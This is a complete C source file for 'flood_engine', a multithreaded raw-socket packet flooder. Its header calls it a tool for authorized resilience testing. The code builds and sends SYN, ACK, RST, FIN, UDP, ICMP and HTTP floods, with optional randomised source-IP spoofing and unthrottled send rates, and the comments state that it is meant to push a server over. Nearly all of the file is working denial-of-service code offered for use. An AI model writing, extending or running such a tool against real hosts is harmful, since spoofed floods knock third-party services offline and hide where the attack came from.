/*
 * flood_engine — raw-packet flood engine for authorized resilience testing.
 *
 * Where stress_engine measures latency, this one generates real packet
 * pressure: it builds packets by hand and blasts them out of raw sockets with
 * no per-packet kernel TCP state. That is what actually pushes a server over.
 *
 * Modes:
 *   syn   — raw TCP SYN, random source port + ISN (real SYN flood: the target
 *           allocates a half-open entry per packet and must track them)
 *   ack   — raw TCP ACK flood
 *   rst   — raw TCP RST flood
 *   fin   — raw TCP FIN flood
 *   udp   — UDP blast (plain socket; with --spoof it switches to a raw
 *           IP_HDRINCL socket so the source address can be randomised)
 *   icmp  — ICMP echo blast, fire-and-forget (no reply wait)
 *   http  — one connection per request, request sent, never waiting for the
 *           body (--read additionally reads the status line)
 *
 * Every mode is fire-and-forget: nothing waits for a reply unless --read is
 * given. "ok" therefore counts packets the kernel accepted, not replies.
 *
 * Raw modes (syn/ack/rst/fin/icmp, and udp with --spoof) need root or
 * CAP_NET_RAW. udp and http run unprivileged.
 *
 * Output: JSON lines on stdout, {"type":"progress",...} then one final
 * {"type":"result",...}. Exit 3 when a raw socket is refused for lack of
 * privilege.
 *
 * Build: see Makefile (cc -O3 -std=c11 -Wall -Wextra -Werror -D_GNU_SOURCE)
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <arpa/inet.h>
#include <errno.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/uio.h>
#include <time.h>
#include <unistd.h>

#define HARD_MAX_THREADS    256
#define HARD_MAX_DURATION_S 1200
#define HARD_MAX_RPS        1000000
#define MAX_PKT             2048
#define MAX_BURST           64
#define HDR_ROOM            40                     /* IP(20) + TCP(20) */
#define MAX_PAYLOAD         (MAX_PKT - HDR_ROOM)
#define CONNECT_TIMEOUT_MS  3000
#define LAT_SAMPLES         8192
#define SNDBUF_BYTES        (4 * 1024 * 1024)

#define ICMP_ECHO_TYPE      8

typedef enum { M_SYN, M_ACK, M_RST, M_FIN, M_UDP, M_ICMP, M_HTTP } flood_mode_t;

/* Self-declared so netinet/ip.h and netinet/ip_icmp.h cannot fight. */
struct icmp_probe {
    uint8_t  type, code;
    uint16_t checksum;
    uint16_t id, seq;
} __attribute__((packed));

typedef struct {
    flood_mode_t mode;
    char   host[256];
    char   path[512];
    char   method[16];
    char   payload_txt[256];
    int    port;
    int    duration_s;
    int    threads;
    long   rps;          /* 0 = unthrottled */
    int    burst;        /* 0 = auto */
    int    size;         /* payload bytes */
    int    ttl;
    int    spoof;
    int    read_reply;
    int    progress_ms;
    struct sockaddr_in dst;
    uint32_t src_ip;
} cfg_t;

typedef struct {
    const cfg_t *cfg;
    int      id;
    pthread_t tid;
    uint64_t rng;
    uint64_t sent, errors, refused_perm;
    uint64_t bytes;
    double   lat_us[LAT_SAMPLES];
    uint64_t lat_n;
    int      fd;
    unsigned char *payload;
    char     req[1024];
    size_t   req_len;
    unsigned char *arena;
    struct iovec  *iov;
    struct mmsghdr *msgs;
    int      burst;
} wctx_t;

static atomic_int g_stop;
static atomic_int g_perm;
static double g_start_s;
static wctx_t *g_workers;
static int g_nworkers;

/* ---------- clock / prng / checksums ---------- */

static uint64_t now_ns(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ull + (uint64_t)ts.tv_nsec;
}

static double now_s(void) { return (double)now_ns() / 1e9; }

static void sleep_ns(uint64_t ns) {
    struct timespec ts = { (time_t)(ns / 1000000000ull), (long)(ns % 1000000000ull) };
    nanosleep(&ts, NULL);
}

/* xorshift64* — per-thread, no locks, no libc rand contention. */
static inline uint64_t xr(uint64_t *s) {
    uint64_t x = *s;
    x ^= x >> 12;
    x ^= x << 25;
    x ^= x >> 27;
    *s = x;
    return x * 0x2545F4914F6CDD1Dull;
}

static uint32_t sum_words(const uint8_t *p, size_t n, uint32_t sum) {
    while (n > 1) {
        sum += ((uint32_t)p[0] << 8) | (uint32_t)p[1];
        p += 2;
        n -= 2;
    }
    if (n) sum += (uint32_t)p[0] << 8;
    return sum;
}

static uint16_t fold(uint32_t s) {
    while (s >> 16) s = (s & 0xffffu) + (s >> 16);
    return (uint16_t)~s;
}

static uint16_t csum(const void *data, size_t len) {
    return fold(sum_words((const uint8_t *)data, len, 0));
}

/* Pseudo-header + segment. The caller zeroes the checksum field first. */
static uint16_t csum_l4(uint32_t src, uint32_t dst, uint8_t proto,
                        const void *seg, size_t len) {
    uint8_t pseudo[12];
    memcpy(pseudo, &src, 4);
    memcpy(pseudo + 4, &dst, 4);
    pseudo[8] = 0;
    pseudo[9] = proto;
    pseudo[10] = (uint8_t)(len >> 8);
    pseudo[11] = (uint8_t)(len & 0xff);
    uint32_t sum = sum_words(pseudo, sizeof(pseudo), 0);
    sum = sum_words((const uint8_t *)seg, len, sum);
    return fold(sum);
}

/* ---------- packet construction ---------- */

static size_t build_icmp(wctx_t *w, unsigned char *buf) {
    const cfg_t *c = w->cfg;
    struct icmp_probe *ic = (struct icmp_probe *)buf;
    ic->type = ICMP_ECHO_TYPE;
    ic->code = 0;
    ic->id   = htons((uint16_t)(w->id + 1));
    ic->seq  = htons((uint16_t)xr(&w->rng));
    ic->checksum = 0;
    size_t plen = (size_t)c->size;
    memcpy(buf + sizeof(*ic), w->payload, plen);
    size_t total = sizeof(*ic) + plen;
    /* Raw ICMP socket: the kernel writes the IP header, we checksum ICMP only. */
    ic->checksum = csum(buf, total);
    return total;
}

static size_t build_l4_ip(wctx_t *w, unsigned char *buf) {
    const cfg_t *c = w->cfg;
    uint32_t sip = c->spoof ? (uint32_t)xr(&w->rng) : c->src_ip;
    if (sip == 0) sip = 0x0a000001u;
    if (sip == c->dst.sin_addr.s_addr) sip ^= 1u;

    struct iphdr *ip = (struct iphdr *)buf;
    ip->version  = 4;
    ip->ihl      = 5;
    ip->tos      = 0;
    ip->id       = htons((uint16_t)xr(&w->rng));
    ip->frag_off = htons(0x4000);   /* DF: keep packets off the fragment path */
    ip->ttl      = (uint8_t)c->ttl;
    ip->saddr    = sip;
    ip->daddr    = c->dst.sin_addr.s_addr;
    ip->check    = 0;

    uint16_t sport = (uint16_t)(1024u + (uint32_t)(xr(&w->rng) % (65535u - 1024u)));

    if (c->mode == M_UDP) {
        struct udphdr *uh = (struct udphdr *)(buf + sizeof(*ip));
        size_t plen = (size_t)c->size;
        uh->source = htons(sport);
        uh->dest   = htons((uint16_t)c->port);
        uh->len    = htons((uint16_t)(sizeof(*uh) + plen));
        uh->check  = 0;
        memcpy(buf + sizeof(*ip) + sizeof(*uh), w->payload, plen);
        ip->protocol = IPPROTO_UDP;
        size_t seglen = sizeof(*uh) + plen;
        ip->tot_len = htons((uint16_t)(sizeof(*ip) + seglen));
        ip->check = csum(ip, sizeof(*ip));
        uh->check = csum_l4(sip, ip->daddr, IPPROTO_UDP, uh, seglen);
        if (uh->check == 0) uh->check = 0xffff;   /* 0 means "no checksum" */
        return sizeof(*ip) + seglen;
    }

    struct tcphdr *th = (struct tcphdr *)(buf + sizeof(*ip));
    memset(th, 0, sizeof(*th));
    th->source  = htons(sport);
    th->dest    = htons((uint16_t)c->port);
    th->seq     = htonl((uint32_t)xr(&w->rng));
    th->ack_seq = htonl((uint32_t)xr(&w->rng));
    th->doff    = 5;
    th->window  = htons(65535);
    th->syn     = (c->mode == M_SYN);
    th->ack     = (c->mode == M_ACK);
    th->rst     = (c->mode == M_RST);
    th->fin     = (c->mode == M_FIN);
    ip->protocol = IPPROTO_TCP;
    ip->tot_len  = htons((uint16_t)(sizeof(*ip) + sizeof(*th)));
    ip->check    = csum(ip, sizeof(*ip));
    th->check    = csum_l4(sip, ip->daddr, IPPROTO_TCP, th, sizeof(*th));
    return sizeof(*ip) + sizeof(*th);
}

/* ---------- http ---------- */

static void build_request(wctx_t *w) {
    const cfg_t *c = w->cfg;
    bool has_body = (strcmp(c->method, "POST") == 0 ||
                     strcmp(c->method, "PUT") == 0 ||
                     strcmp(c->method, "PATCH") == 0);
    int n = snprintf(w->req, sizeof(w->req),
                     "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: hackit-flood/1.0\r\n"
                     "Connection: close\r\nAccept: */*\r\n",
                     c->method, c->path, c->host);
    if (has_body) {
        n += snprintf(w->req + n, sizeof(w->req) - (size_t)n, "Content-Length: %d\r\n\r\n", c->size);
    } else {
        n += snprintf(w->req + n, sizeof(w->req) - (size_t)n, "\r\n");
    }
    if (has_body) {
        size_t room = sizeof(w->req) - (size_t)n;
        size_t copy = (size_t)c->size < room ? (size_t)c->size : room;
        memcpy(w->req + n, w->payload, copy);
        n += (int)copy;
    }
    w->req_len = (size_t)n;
}

static void record_lat(wctx_t *w, double us) {
    if (w->lat_n < LAT_SAMPLES) {
        w->lat_us[w->lat_n++] = us;
    } else {
        uint64_t j = xr(&w->rng) % (w->lat_n + 1);
        if (j < LAT_SAMPLES) w->lat_us[j] = us;
    }
    w->lat_n++;
}

static int http_batch(wctx_t *w, int n) {
    const cfg_t *c = w->cfg;
    int done = 0;
    for (int i = 0; i < n; i++) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) { w->errors++; continue; }
        int one = 1;
        setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
        struct timeval tv = { CONNECT_TIMEOUT_MS / 1000, (CONNECT_TIMEOUT_MS % 1000) * 1000 };
        setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

        uint64_t t0 = now_ns();
        if (connect(fd, (struct sockaddr *)&c->dst, sizeof(c->dst)) != 0) {
            w->errors++;
            close(fd);
            continue;
        }
        ssize_t s = send(fd, w->req, w->req_len, MSG_NOSIGNAL);
        if (s != (ssize_t)w->req_len) {
            w->errors++;
            close(fd);
            continue;
        }
        if (c->read_reply) {
            char rb[512];
            ssize_t r = recv(fd, rb, sizeof(rb), 0);
            if (r <= 0) { w->errors++; close(fd); continue; }
            int status = -1;
            if (r > 12 && strncmp(rb, "HTTP/", 5) == 0) status = atoi(rb + 9);
            if (status >= 500) { w->errors++; close(fd); continue; }
        }
        close(fd);
        w->bytes += w->req_len;
        record_lat(w, (double)(now_ns() - t0) / 1000.0);
        done++;
    }
    return done;
}

/* ---------- dispatch ---------- */

static int send_batch(wctx_t *w, int n) {
    if (w->cfg->mode == M_HTTP) {
        return http_batch(w, n);
    }
    const cfg_t *c = w->cfg;
    int built = 0;
    for (int i = 0; i < n; i++) {
        unsigned char *p = w->arena + (size_t)i * MAX_PKT;
        size_t len;
        if (c->mode == M_ICMP) {
            len = build_icmp(w, p);
        } else if (c->mode == M_UDP && !c->spoof) {
            /* Plain UDP socket: the kernel writes IP+UDP, we supply payload. */
            len = (size_t)c->size;
            memcpy(p, w->payload, len);
        } else {
            len = build_l4_ip(w, p);
        }
        w->iov[i].iov_base = p;
        w->iov[i].iov_len  = len;
        w->msgs[i].msg_hdr.msg_iov = &w->iov[i];
        w->msgs[i].msg_hdr.msg_iovlen = 1;
        w->bytes += len;
        built++;
    }
    int rc = sendmmsg(w->fd, w->msgs, (unsigned)built, 0);
    if (rc < 0) {
        w->bytes -= (uint64_t)w->iov[0].iov_len * (uint64_t)built;   /* approximation on hard error */
        if (errno == EPERM || errno == EACCES) {
            atomic_store(&g_perm, 1);
            atomic_store(&g_stop, 1);
        }
        return -1;
    }
    return rc;
}

static void *worker(void *arg) {
    wctx_t *w = (wctx_t *)arg;
    const cfg_t *c = w->cfg;

    /* Per-thread packet slot: global rate / threads, in ns. */
    uint64_t interval_ns = 0;
    if (c->rps > 0) {
        interval_ns = 1000000000ull * (uint64_t)c->threads / (uint64_t)c->rps;
        if (interval_ns == 0) interval_ns = 1;
    }

    double deadline = g_start_s + (double)c->duration_s;
    uint64_t next = now_ns();

    while (!atomic_load(&g_stop) && now_s() < deadline) {
        int m = send_batch(w, w->burst);
        if (m < 0) {
            w->errors++;
        } else {
            w->sent += (uint64_t)m;
        }
        if (interval_ns) {
            next += interval_ns * (uint64_t)(m > 0 ? m : 1);
            uint64_t nw = now_ns();
            if (next > nw) {
                sleep_ns(next - nw);
            } else if (nw - next > 50000000ull) {
                next = nw;   /* stalled (gc/loss): resync instead of spiralling */
            }
        }
    }
    return NULL;
}

/* ---------- reporting ---------- */

static const char *mode_name(flood_mode_t m) {
    switch (m) {
        case M_SYN: return "syn";
        case M_ACK: return "ack";
        case M_RST: return "rst";
        case M_FIN: return "fin";
        case M_UDP: return "udp";
        case M_ICMP: return "icmp";
        default: return "http";
    }
}

static int cmp_double(const void *a, const void *b) {
    double da = *(const double *)a, db = *(const double *)b;
    return (da > db) - (da < db);
}

static double percentile(const double *sorted, size_t n, double p) {
    if (n == 0) return 0.0;
    double idx = p / 100.0 * (double)(n - 1);
    size_t lo = (size_t)idx;
    size_t hi = lo + 1;
    if (hi >= n) return sorted[lo];
    double frac = idx - (double)lo;
    return sorted[lo] * (1.0 - frac) + sorted[hi] * frac;
}

static void *monitor(void *arg) {
    int progress_ms = *(int *)arg;
    while (!atomic_load(&g_stop)) {
        struct timespec ts = { progress_ms / 1000, (long)(progress_ms % 1000) * 1000000L };
        nanosleep(&ts, NULL);
        if (atomic_load(&g_stop)) break;
        double elapsed = now_s() - g_start_s;
        if (elapsed <= 0.0) continue;
        uint64_t sent = 0, err = 0, bytes = 0;
        for (int i = 0; i < g_nworkers; i++) {
            sent  += g_workers[i].sent;
            err   += g_workers[i].errors;
            bytes += g_workers[i].bytes;
        }
        printf("{\"type\":\"progress\",\"elapsed_s\":%.3f,\"requests\":%llu,\"ok\":%llu,"
               "\"errors\":%llu,\"achieved_rps\":%.2f,\"mbps\":%.3f}\n",
               elapsed, (unsigned long long)sent, (unsigned long long)sent,
               (unsigned long long)err, (double)sent / elapsed,
               (double)bytes * 8.0 / elapsed / 1e6);
        fflush(stdout);
    }
    return NULL;
}

static void json_escape(const char *in, char *out, size_t out_sz) {
    size_t j = 0;
    for (size_t i = 0; in[i] && j + 2 < out_sz; i++) {
        unsigned char ch = (unsigned char)in[i];
        if (ch == '"' || ch == '\\') { out[j++] = '\\'; out[j++] = (char)ch; }
        else if (ch >= 0x20) out[j++] = (char)ch;
    }
    out[j] = '\0';
}

static void usage(const char *prog) {
    fprintf(stderr,
        "usage: %s <syn|ack|rst|fin|udp|icmp|http> <host> [port] [options]\n"
        "  --duration N     seconds (1-%d, default 10)\n"
        "  --threads N      worker threads (1-%d, default 4)\n"
        "  --rps N          global packet rate cap, 0 = unthrottled (default 0)\n"
        "  --burst N        packets per syscall, 0 = auto (default 0)\n"
        "  --size N         payload bytes for udp/icmp/http (default 64; tcp raw has no payload)\n"
        "  --ttl N          IP TTL for raw modes (default 64)\n"
        "  --spoof          randomise the source IP (raw modes; udp switches to a raw socket)\n"
        "  --method M       http verb: GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS (default GET)\n"
        "  --path P         http path (default /)\n"
        "  --read           http: also read the status line (default: send and move on)\n"
        "  --payload S      payload text for udp/icmp (default hackit-flood)\n"
        "  --progress-ms N  progress line interval, 0 = silent (default 500)\n",
        prog, HARD_MAX_DURATION_S, HARD_MAX_THREADS);
}

static int parse_mode(const char *s, flood_mode_t *out) {
    static const struct { const char *n; flood_mode_t m; } tab[] = {
        {"syn", M_SYN}, {"ack", M_ACK}, {"rst", M_RST}, {"fin", M_FIN},
        {"udp", M_UDP}, {"icmp", M_ICMP}, {"http", M_HTTP},
    };
    for (size_t i = 0; i < sizeof(tab) / sizeof(tab[0]); i++) {
        if (strcmp(s, tab[i].n) == 0) { *out = tab[i].m; return 0; }
    }
    return -1;
}

/* One raw/udp socket per worker. Returns fd or -1. Sets *perm on EPERM. */
static int open_flood_socket(const cfg_t *c, int *perm) {
    int fd, one = 1;
    *perm = 0;

    if (c->mode == M_HTTP) return -1;

    if (c->mode == M_ICMP) {
        fd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (fd < 0) { if (errno == EPERM || errno == EACCES) *perm = 1; return -1; }
    } else if (c->mode == M_UDP && !c->spoof) {
        fd = socket(AF_INET, SOCK_DGRAM, 0);
        if (fd < 0) return -1;
    } else {
        int proto = (c->mode == M_UDP) ? IPPROTO_UDP : IPPROTO_TCP;
        fd = socket(AF_INET, SOCK_RAW, proto);
        if (fd < 0) { if (errno == EPERM || errno == EACCES) *perm = 1; return -1; }
        if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) != 0) {
            close(fd);
            return -1;
        }
    }

    int sndbuf = SNDBUF_BYTES;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    if (c->mode == M_ICMP || (c->mode == M_UDP && !c->spoof)) {
        setsockopt(fd, IPPROTO_IP, IP_TTL, &c->ttl, sizeof(c->ttl));
    }
    /* Connected socket: sendmmsg then needs no per-packet address. */
    if (connect(fd, (const struct sockaddr *)&c->dst, sizeof(c->dst)) != 0) {
        /* Raw sockets can refuse connect on some kernels; harmless, use msg_name then. */
        errno = 0;
    }
    return fd;
}

int main(int argc, char **argv) {
    if (argc < 3) { usage(argv[0]); return 2; }

    cfg_t cfg;
    memset(&cfg, 0, sizeof(cfg));
    if (parse_mode(argv[1], &cfg.mode) != 0) { usage(argv[0]); return 2; }

    bool needs_port = (cfg.mode != M_ICMP);
    if (needs_port && argc < 4) { usage(argv[0]); return 2; }

    snprintf(cfg.host, sizeof(cfg.host), "%s", argv[2]);
    cfg.port = needs_port ? atoi(argv[3]) : 0;
    snprintf(cfg.path, sizeof(cfg.path), "/");
    snprintf(cfg.method, sizeof(cfg.method), "GET");
    snprintf(cfg.payload_txt, sizeof(cfg.payload_txt), "hackit-flood");
    cfg.duration_s = 10;
    cfg.threads = 4;
    cfg.rps = 0;
    cfg.burst = 0;
    cfg.size = 64;
    cfg.ttl = 64;
    cfg.progress_ms = 500;

    int opt_start = needs_port ? 4 : 3;
    /* icmp has no port; tolerate a stray numeric argument after the host. */
    if (!needs_port && argc > 3 && argv[3][0] != '-') opt_start = 4;

    for (int i = opt_start; i < argc; i++) {
        if      (!strcmp(argv[i], "--duration") && i + 1 < argc) cfg.duration_s = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--threads")  && i + 1 < argc) cfg.threads = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--rps")      && i + 1 < argc) cfg.rps = atol(argv[++i]);
        else if (!strcmp(argv[i], "--burst")    && i + 1 < argc) cfg.burst = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--size")     && i + 1 < argc) cfg.size = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--ttl")      && i + 1 < argc) cfg.ttl = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--method")   && i + 1 < argc) snprintf(cfg.method, sizeof(cfg.method), "%s", argv[++i]);
        else if (!strcmp(argv[i], "--path")     && i + 1 < argc) snprintf(cfg.path, sizeof(cfg.path), "%s", argv[++i]);
        else if (!strcmp(argv[i], "--payload")  && i + 1 < argc) snprintf(cfg.payload_txt, sizeof(cfg.payload_txt), "%s", argv[++i]);
        else if (!strcmp(argv[i], "--progress-ms") && i + 1 < argc) cfg.progress_ms = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--spoof"))    cfg.spoof = 1;
        else if (!strcmp(argv[i], "--read"))     cfg.read_reply = 1;
        else { usage(argv[0]); return 2; }
    }

    if (cfg.duration_s < 1) cfg.duration_s = 1;
    if (cfg.duration_s > HARD_MAX_DURATION_S) cfg.duration_s = HARD_MAX_DURATION_S;
    if (cfg.threads < 1) cfg.threads = 1;
    if (cfg.threads > HARD_MAX_THREADS) cfg.threads = HARD_MAX_THREADS;
    if (cfg.rps < 0) cfg.rps = 0;
    if (cfg.rps > HARD_MAX_RPS) cfg.rps = HARD_MAX_RPS;
    if (cfg.burst < 0) cfg.burst = 0;
    if (cfg.burst > MAX_BURST) cfg.burst = MAX_BURST;
    if (cfg.burst == 0) cfg.burst = cfg.rps == 0 ? 32 : 1;
    if (cfg.size < 0) cfg.size = 0;
    if (cfg.size > MAX_PAYLOAD) cfg.size = MAX_PAYLOAD;
    if (cfg.ttl < 1) cfg.ttl = 1;
    if (cfg.ttl > 255) cfg.ttl = 255;
    if (cfg.mode != M_UDP && cfg.mode != M_ICMP && cfg.mode != M_HTTP) cfg.size = 0;

    {
        struct addrinfo hints = {0}, *res = NULL;
        char service[8];
        hints.ai_family = AF_INET;
        hints.ai_socktype = (cfg.mode == M_ICMP) ? 0 : SOCK_STREAM;
        snprintf(service, sizeof(service), "%d", cfg.port);
        if (getaddrinfo(cfg.host, needs_port ? service : NULL, &hints, &res) != 0) {
            fprintf(stderr, "flood_engine: cannot resolve %s\n", cfg.host);
            return 2;
        }
        memcpy(&cfg.dst, res->ai_addr, sizeof(struct sockaddr_in));
        freeaddrinfo(res);
    }

    /* Local source address the kernel would pick for this destination. */
    {
        int probe = socket(AF_INET, SOCK_DGRAM, 0);
        cfg.src_ip = 0;
        if (probe >= 0) {
            struct sockaddr_in me;
            socklen_t ml = sizeof(me);
            if (connect(probe, (struct sockaddr *)&cfg.dst, sizeof(cfg.dst)) == 0 &&
                getsockname(probe, (struct sockaddr *)&me, &ml) == 0) {
                cfg.src_ip = me.sin_addr.s_addr;
            }
            close(probe);
        }
    }

    g_start_s = now_s();
    g_nworkers = cfg.threads;
    g_workers = calloc((size_t)cfg.threads, sizeof(wctx_t));
    if (!g_workers) { fprintf(stderr, "flood_engine: out of memory\n"); return 1; }

    for (int i = 0; i < cfg.threads; i++) {
        wctx_t *w = &g_workers[i];
        w->cfg = &cfg;
        w->id = i;
        w->rng = (uint64_t)now_ns() ^ ((uint64_t)(i + 1) * 0x9E3779B97F4A7C15ull);
        w->burst = cfg.burst;
        w->lat_n = 0;
        w->payload = malloc((size_t)cfg.size + 1);
        w->arena = malloc((size_t)cfg.burst * MAX_PKT);
        w->iov   = calloc((size_t)cfg.burst, sizeof(struct iovec));
        w->msgs  = calloc((size_t)cfg.burst, sizeof(struct mmsghdr));
        if (!w->payload || !w->arena || !w->iov || !w->msgs) {
            fprintf(stderr, "flood_engine: out of memory\n");
            return 1;
        }
        size_t ptxt = strlen(cfg.payload_txt);
        for (int k = 0; k < cfg.size; k++) {
            w->payload[k] = ptxt ? (unsigned char)cfg.payload_txt[(size_t)k % ptxt] : 0x41;
        }
        w->payload[cfg.size] = 0;
        if (cfg.mode == M_HTTP) build_request(w);

        int perm = 0;
        w->fd = open_flood_socket(&cfg, &perm);
        if (perm) atomic_store(&g_perm, 1);
        if (w->fd < 0 && cfg.mode != M_HTTP) {
            fprintf(stderr, "flood_engine: socket() failed: %s\n", strerror(errno));
            return atomic_load(&g_perm) ? 3 : 1;
        }
    }

    pthread_t mon;
    bool mon_started = false;
    if (cfg.progress_ms > 0) {
        if (pthread_create(&mon, NULL, monitor, &cfg.progress_ms) == 0) mon_started = true;
    }
    for (int i = 0; i < cfg.threads; i++) {
        if (pthread_create(&g_workers[i].tid, NULL, worker, &g_workers[i]) != 0) {
            atomic_store(&g_stop, 1);
            fprintf(stderr, "flood_engine: pthread_create failed\n");
            return 1;
        }
    }
    for (int i = 0; i < cfg.threads; i++) pthread_join(g_workers[i].tid, NULL);
    atomic_store(&g_stop, 1);
    if (mon_started) pthread_join(mon, NULL);

    double elapsed = now_s() - g_start_s;
    if (elapsed <= 0.0) elapsed = 1e-6;

    uint64_t sent = 0, err = 0, bytes = 0, lat_n = 0;
    for (int i = 0; i < cfg.threads; i++) {
        sent  += g_workers[i].sent;
        err   += g_workers[i].errors;
        bytes += g_workers[i].bytes;
        if (g_workers[i].lat_n) lat_n += g_workers[i].lat_n;
        close(g_workers[i].fd);
    }

    static double lat[LAT_SAMPLES * HARD_MAX_THREADS];
    size_t ln = 0;
    for (int i = 0; i < cfg.threads; i++) {
        for (uint64_t k = 0; k < g_workers[i].lat_n && k < LAT_SAMPLES; k++) {
            if (ln < sizeof(lat) / sizeof(lat[0])) lat[ln++] = g_workers[i].lat_us[k];
        }
    }
    qsort(lat, ln, sizeof(double), cmp_double);

    char esc_host[512], target[560];
    json_escape(cfg.host, esc_host, sizeof(esc_host));
    if (needs_port) snprintf(target, sizeof(target), "%s:%d", esc_host, cfg.port);
    else snprintf(target, sizeof(target), "%s", esc_host);

    uint64_t total = sent + err;
    double err_rate = total ? (double)err / (double)total : 0.0;

    printf("{\"type\":\"result\",\"engine\":\"flood\",\"mode\":\"%s\",\"target\":\"%s\","
           "\"method\":\"%s\",\"duration_s\":%.3f,\"requests\":%llu,\"ok\":%llu,\"errors\":%llu,"
           "\"achieved_rps\":%.2f,\"error_rate\":%.4f,\"bytes_sent\":%llu,\"mbps\":%.3f,"
           "\"spoof\":%s,\"payload_bytes\":%d,\"threads\":%d,\"burst\":%d,"
           "\"latency_ms\":{\"p50\":%.3f,\"p90\":%.3f,\"p99\":%.3f,\"max\":%.3f},"
           "\"note\":\"%s\"}\n",
           mode_name(cfg.mode), target, cfg.method, elapsed,
           (unsigned long long)total, (unsigned long long)sent, (unsigned long long)err,
           (double)total / elapsed, err_rate,
           (unsigned long long)bytes, (double)bytes * 8.0 / elapsed / 1e6,
           cfg.spoof ? "true" : "false", cfg.size, cfg.threads, cfg.burst,
           percentile(lat, ln, 50) / 1000.0, percentile(lat, ln, 90) / 1000.0,
           percentile(lat, ln, 99) / 1000.0, ln ? lat[ln - 1] / 1000.0 : 0.0,
           lat_n ? "latency measured end-to-end per request"
                 : "fire-and-forget: ok counts packets accepted by the kernel, not replies");

    if (atomic_load(&g_perm) && cfg.mode != M_HTTP) {
        fprintf(stderr, "flood_engine: raw sockets need root or CAP_NET_RAW — run with sudo or use udp/http\n");
        return 3;
    }
    return 0;
}
